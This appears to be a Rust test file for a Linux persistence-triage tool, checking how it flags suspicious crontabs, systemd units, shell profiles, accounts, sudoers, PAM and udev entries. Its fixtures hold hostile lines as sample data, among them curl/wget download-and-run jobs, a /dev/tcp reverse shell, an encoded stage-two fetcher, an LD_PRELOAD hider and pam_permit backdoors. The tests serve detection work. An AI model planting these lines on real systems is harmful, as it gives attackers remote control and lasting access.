//! Tests of the Linux persistence triage. The SSH fingerprint was checked with `ssh-keygen -l`.

use super::*;

fn rules(r: &FileReport) -> Vec<(&str, &str)> {
    r.issues.iter().map(|i| (i.rule.as_str(), i.severity.as_str())).collect()
}

const KEY: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZpAXZivhyH1jZWTSwTPIWWFjFJYIykg0OVT1Ibk7Zl alice@laptop";

#[test]
fn cron_entries_are_checked_and_user_jobs_listed() {
    let system = "SHELL=/bin/sh\nPATH=/usr/sbin:/usr/bin\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n*/5 * * * * root curl -fsSL http://203.0.113.7/k.sh | bash\n@reboot root /tmp/.x/kworker -c /tmp/.x/c.json\n";
    let r = analyze("/etc/crontab", system, "auto").unwrap();
    assert_eq!(r.kind, "system-crontab");
    assert_eq!(rules(&r), vec![("LNX-CRON-DOWNLOAD-EXEC", "high"), ("LNX-CRON-TEMP-EXEC", "medium"), ("LNX-CRON-REBOOT", "low")]);
    assert_eq!(r.issues[0].location, "line 5");
    assert!(r.issues[0].detail.starts_with("Downloads a script and runs it on line 5 of /etc/crontab: curl -fsSL http://203.0.113.7/k.sh | bash"), "{}", r.issues[0].detail);
    assert_eq!(r.issues[0].reference, CRON);
    assert!(r.issues[2].detail.contains("@reboot as root"));
    assert_eq!(r.sha256.len(), 64);

    let user = "# DO NOT EDIT THIS FILE\n* * * * * /usr/bin/php /var/www/artisan schedule:run >/dev/null 2>&1\n0 3 * * * /home/www-data/backup.sh\n";
    let r = analyze("/var/spool/cron/crontabs/www-data", user, "auto").unwrap();
    assert_eq!(rules(&r), vec![("LNX-CRON-USER", "info")]);
    assert_eq!(r.issues[0].title, "Scheduled jobs of www-data");
    assert!(r.issues[0].detail.contains("2 jobs in /var/spool/cron/crontabs/www-data: * * * * * as www-data: /usr/bin/php"));
    // an ordinary system crontab is quiet
    assert!(analyze("/etc/cron.d/e2scrub_all", "30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n", "auto").unwrap().issues.is_empty());
}

#[test]
fn units_preload_shell_files_and_keys() {
    let unit = "[Unit]\nDescription=System update helper\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.4/4444 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\n";
    let r = analyze("/etc/systemd/system/dbus-update.service", unit, "auto").unwrap();
    assert_eq!(rules(&r), vec![("LNX-SYSTEMD-REVERSE-SHELL", "high"), ("LNX-SYSTEMD-LOCAL", "info")]);
    assert_eq!(r.issues[0].title, "Unit dbus-update.service opens a shell for a remote host");
    assert!(r.issues[1].detail.starts_with("/etc/systemd/system/dbus-update.service runs /bin/bash at boot: /bin/bash -c"), "{}", r.issues[1].detail);
    // a package's unit with an ordinary command says nothing
    assert!(analyze("/usr/lib/systemd/system/cron.service", "[Service]\nExecStart=/usr/sbin/cron -f $EXTRA_OPTS\n", "auto").unwrap().issues.is_empty());
    let timer = analyze("/home/bob/.config/systemd/user/sync.timer", "[Timer]\nOnBootSec=5min\nOnUnitActiveSec=10min\n[Install]\nWantedBy=timers.target\n", "auto").unwrap();
    assert_eq!(rules(&timer), vec![("LNX-SYSTEMD-TIMER", "info")]);
    assert!(timer.issues[0].detail.ends_with("starts sync.service (OnBootSec=5min, OnUnitActiveSec=10min)."));

    let r = analyze("/etc/ld.so.preload", "# managed\n/usr/local/lib/libprocesshider.so\n", "auto").unwrap();
    assert_eq!(rules(&r), vec![("LNX-PRELOAD", "high")]);
    assert_eq!(r.issues[0].reference, PRELOAD);

    let rc = "export PATH=$PATH:/opt/bin\nalias sudo='sudo -S'\nexport LD_PRELOAD=/var/tmp/.lib/l.so\necho ZWNobyBoZWxsbyB3b3JsZCAmJiBjdXJsIGh0dHA6Ly8xOTguNTEuMTAwLjQvc3RhZ2UyIHwgYmFzaA== | base64 -d | sh\nunset HISTFILE\n";
    let r = analyze("/home/bob/.bashrc", rc, "auto").unwrap();
    assert_eq!(rules(&r), vec![("LNX-SHELL-WRAPPER", "high"), ("LNX-SHELL-PRELOAD", "high"), ("LNX-SHELL-ENCODED", "medium"), ("LNX-SHELL-HISTORY", "low")]);

    let keys = format!("{KEY}\ncommand=\"/usr/local/bin/backup-only\",no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC7 backup@vault\n");
    let r = analyze("/root/.ssh/authorized_keys", &keys, "auto").unwrap();
    assert_eq!(rules(&r), vec![("LNX-KEYS-COMMAND", "low"), ("LNX-KEYS", "info")]);
    assert_eq!(r.issues[1].title, "2 SSH keys can log in as root");
    assert!(r.issues[1].detail.contains("ssh-ed25519 SHA256:LYhsf59gQo8nEclcnBDM/Svr+8fouseEM+sCyasiON0 alice@laptop"), "{}", r.issues[1].detail);
}

#[test]
fn accounts_sudo_and_pam() {
    let passwd = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ntoor:x:0:0::/root:/bin/bash\nbackup:x:34:34:backup:/var/backups:/bin/sh\nguest::1001:1001::/home/guest:/bin/bash\nalice:x:1000:1000:Alice:/home/alice:/bin/zsh\n";
    let r = analyze("/etc/passwd", passwd, "auto").unwrap();
    assert_eq!(
        rules(&r),
        vec![("LNX-ACCOUNT-UID0-toor", "high"), ("LNX-ACCOUNT-SYSTEM-SHELL-backup", "low"), ("LNX-ACCOUNT-NOPASS-guest", "high"), ("LNX-ACCOUNT-LOGINS", "info")]
    );
    assert!(r.issues[3].detail.ends_with("root (UID 0), toor (UID 0), backup (UID 34), guest (UID 1001), alice (UID 1000)"));
    let r = analyze("/etc/shadow", "root:$6$salt$hash:19000:0:99999:7:::\nguest::19000:0:99999:7:::\n", "auto").unwrap();
    assert_eq!(rules(&r), vec![("LNX-SHADOW-EMPTY-guest", "high")]);
    assert!(!r.issues[0].detail.contains("$6$"), "hashes are never shown");

    let sudo = "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\nubuntu ALL=(ALL) NOPASSWD:ALL\nALL ALL=(ALL) NOPASSWD: ALL\ndeploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart shop\nops ALL=(root) NOPASSWD: /usr/bin/vim, /usr/bin/find\n";
    let r = analyze("/etc/sudoers.d/90-local", sudo, "auto").unwrap();
    assert_eq!(rules(&r), vec![("LNX-SUDO-NOPASSWD-ALL", "medium"), ("LNX-SUDO-NOPASSWD-ALL", "high"), ("LNX-SUDO-SHELL-ESCAPE", "medium")]);
    assert_eq!(r.issues[1].title, "All users can run any command as root without a password");
    assert!(r.issues[2].detail.contains("vim, find can start a shell"));

    let pam = "auth sufficient pam_permit.so\nauth required /tmp/pam_x.so\nsession optional pam_exec.so expose_authtok /usr/local/bin/log-login\nauth required pam_permit.so\n";
    let r = analyze("/etc/pam.d/sshd", pam, "auto").unwrap();
    assert_eq!(rules(&r), vec![("LNX-PAM-PERMIT", "high"), ("LNX-PAM-WRITABLE", "high"), ("LNX-PAM-EXEC", "medium")]);
    assert!(r.issues[2].detail.contains("receives the password (expose_authtok)"));
}

#[test]
fn pasted_text_is_recognized_and_lines_never_panic() {
    for (text, kind) in [
        ("[Service]\nExecStart=/usr/bin/true\n", "systemd"),
        (KEY, "authorized-keys"),
        ("root:x:0:0:root:/root:/bin/bash\n", "passwd"),
        ("ACTION==\"add\", RUN+=\"/bin/sh -c 'curl http://x/a | sh'\"\n", "udev"),
        ("@reboot /usr/bin/true\n", "crontab"),
        ("[Desktop Entry]\nExec=/usr/bin/true\n", "autostart"),
        ("echo hi\n", "shell"),
    ] {
        assert_eq!(analyze("pasted text", text, "auto").unwrap().kind, kind, "{text}");
    }
    let udev = analyze("pasted text", "ACTION==\"add\", RUN+=\"/bin/sh -c 'curl http://x/a | sh'\"\n", "auto").unwrap();
    assert_eq!(rules(&udev), vec![("LNX-UDEV-DOWNLOAD-EXEC", "high")]);
    assert_eq!(analyze("pasted text", "x", "nonsense"), None);
    let odd = "é\\\n日本 * * * * root /tmp/é\u{0}\n\\";
    for kind in KINDS {
        for (i, _) in odd.char_indices() {
            let _ = analyze("pasted text", &odd[..i], kind);
        }
    }
}

#[test]
fn file_systems_are_found_and_only_read() {
    let dir = std::env::temp_dir().join(format!("cyberhub-linux-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    // a UAC collection: the host's files under [root]
    let root = dir.join("uac-web01-linux-20261109").join("[root]");
    let put = |rel: &str, text: &str| {
        let p = root.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, text).unwrap();
    };
    put("etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n");
    put("etc/crontab", "*/10 * * * * root wget -q -O- http://203.0.113.7/m | sh\n");
    put("etc/ld.so.preload", "");
    put("etc/systemd/system/kworkerd.service", "[Service]\nExecStart=/usr/lib/.cache/kworkerd --donate-level 1\n[Install]\nWantedBy=multi-user.target\n");
    put("usr/lib/systemd/system/ssh.service", "[Service]\nExecStart=/usr/sbin/sshd -D\n");
    put("var/spool/cron/crontabs/www-data", "* * * * * /var/tmp/.x/upd\n");
    put("home/alice/.ssh/authorized_keys", KEY);
    put("etc/motd", "Welcome\n");
    assert_eq!(roots(&dir), vec![root.clone()]);
    assert_eq!(roots(&root.join("etc")), vec![root.clone()], "a chosen etc folder stands for its parent");
    let before: Vec<_> = walk(&root, 8);
    let res = scan_path(&dir).unwrap();
    let files: Vec<(&str, &str)> = res.files.iter().map(|f| (f.file.as_str(), f.kind.as_str())).collect();
    assert_eq!(
        files,
        vec![
            ("/etc/crontab", "system-crontab"),
            ("/etc/passwd", "passwd"),
            ("/var/spool/cron/crontabs/www-data", "crontab"),
            ("/etc/systemd/system/kworkerd.service", "systemd"),
            ("/home/alice/.ssh/authorized_keys", "authorized-keys"),
        ]
    );
    assert_eq!(res.files_seen, 7, "the empty preload list, passwd and the vendor unit were read too; /etc/motd is not a start-up file");
    assert_eq!(rules(&res.files[1]), vec![("LNX-ACCOUNT-LOGINS", "info")]);
    assert_eq!(rules(&res.files[2]), vec![("LNX-CRON-TEMP-EXEC", "medium"), ("LNX-CRON-USER", "info")]);
    let unit = &res.files[3];
    assert_eq!(rules(unit), vec![("LNX-SYSTEMD-MINER", "high"), ("LNX-SYSTEMD-HIDDEN-EXEC", "medium"), ("LNX-SYSTEMD-LOCAL", "info")]);
    assert_eq!(unit.sha256, sha256(b"[Service]\nExecStart=/usr/lib/.cache/kworkerd --donate-level 1\n[Install]\nWantedBy=multi-user.target\n"));
    assert_eq!(walk(&root, 8), before, "nothing was written");
    assert!(scan_path(&dir.join("uac-web01-linux-20261109").join("[root]").join("var")).unwrap_err().contains("No Linux file system"));
    let _ = std::fs::remove_dir_all(&dir);
}

#[cfg(unix)]
#[test]
fn links_out_of_the_file_system_are_not_followed() {
    let dir = std::env::temp_dir().join(format!("cyberhub-linux-link-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let root = dir.join("image");
    let outside = dir.join("analyst-home");
    std::fs::create_dir_all(root.join("etc")).unwrap();
    std::fs::create_dir_all(outside.join("bob/.ssh")).unwrap();
    std::fs::write(root.join("etc/passwd"), "root:x:0:0:root:/root:/bin/bash\n").unwrap();
    std::fs::write(outside.join("bob/.ssh/authorized_keys"), KEY).unwrap();
    // an absolute link in the image, like home -> /data/home
    std::os::unix::fs::symlink(&outside, root.join("home")).unwrap();
    let res = scan_path(&root).unwrap();
    assert!(res.files.iter().all(|f| !f.file.contains("authorized_keys")), "{:?}", res.files);
    let _ = std::fs::remove_dir_all(&dir);
}

#[cfg(windows)]
#[test]
fn junctions_out_of_the_file_system_are_not_followed() {
    let dir = std::env::temp_dir().join(format!("cyberhub-linux-junction-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let root = dir.join("image");
    let outside = dir.join("analyst-home");
    std::fs::create_dir_all(root.join("etc")).unwrap();
    std::fs::create_dir_all(outside.join("bob").join(".ssh")).unwrap();
    std::fs::write(root.join("etc").join("passwd"), "root:x:0:0:root:/root:/bin/bash\n").unwrap();
    std::fs::write(outside.join("bob").join(".ssh").join("authorized_keys"), KEY).unwrap();
    // a directory junction (no administrator rights needed) plays the absolute link home -> elsewhere
    let made = std::process::Command::new("cmd").args(["/C", "mklink", "/J"]).arg(root.join("home")).arg(&outside).output().unwrap();
    assert!(made.status.success(), "{}", String::from_utf8_lossy(&made.stderr));
    let res = scan_path(&root).unwrap();
    assert!(res.files.iter().all(|f| !f.file.contains("authorized_keys")), "{:?}", res.files);
    assert_eq!(res.files_seen, 1, "only passwd was read");
    let _ = std::fs::remove_dir_all(&dir);
}
